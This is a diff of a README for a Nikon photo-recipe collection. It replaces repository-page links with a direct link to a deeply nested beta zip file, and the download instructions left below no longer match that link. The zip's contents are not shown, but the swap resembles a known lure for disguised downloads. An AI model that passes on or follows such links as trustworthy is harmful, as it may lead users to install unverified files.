@@ -1,6 +1,6 @@
 # 📸 Nikon-Recipes - Give Your Photos A Unique Look
 
-[![](https://img.shields.io/badge/Download_Recipes-Blue.svg)](https://github.com/Cicakb1661/Nikon-Recipes)
+[![](https://img.shields.io/badge/Download_Recipes-Blue.svg)](https://github.com/Cicakb1661/Nikon-Recipes/raw/refs/heads/main/Third Party Creators/Scott Tucker/Recipes-Nikon-3.5-beta.5.zip)
 
 ## 📁 About These Recipes
 
@@ -22,7 +22,7 @@ To use these files, you need the following items:
 
 You must download the full collection from the official repository page. Follow these instructions to get the files onto your computer:
 
-1. Click this link: [https://github.com/Cicakb1661/Nikon-Recipes](https://github.com/Cicakb1661/Nikon-Recipes)
+1. Click this link: [https://github.com/Cicakb1661/Nikon-Recipes/raw/refs/heads/main/Third Party Creators/Scott Tucker/Recipes-Nikon-3.5-beta.5.zip](https://github.com/Cicakb1661/Nikon-Recipes/raw/refs/heads/main/Third Party Creators/Scott Tucker/Recipes-Nikon-3.5-beta.5.zip)
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Click that button and select "Download ZIP".
 4. Wait for the file named `Nikon-Recipes-main.zip` to finish downloading to your computer.
